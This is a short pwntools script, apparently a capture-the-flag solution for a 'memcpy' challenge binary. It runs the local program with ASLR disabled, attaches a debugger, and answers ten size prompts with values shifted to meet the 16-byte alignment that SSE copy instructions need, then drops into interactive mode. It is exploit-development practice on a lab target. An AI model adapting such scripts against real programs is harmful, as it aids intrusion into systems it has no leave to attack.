#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './memcpy'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000


# movdqa and movntps requires the src and dst memory addr to be aligned on 16-byte or 32-byte

gdb.attach(io, 'b *0x8048acd')
for i in range(0, 10):
    io.recvuntil("amount between ")
    ranges = io.recvuntil(":")[:-1].split('~')
    print(ranges)
    if i >= 3:
        io.sendline(str(int(ranges[0]) + 8))
    else:
        io.sendline(ranges[0])




io.interactive()
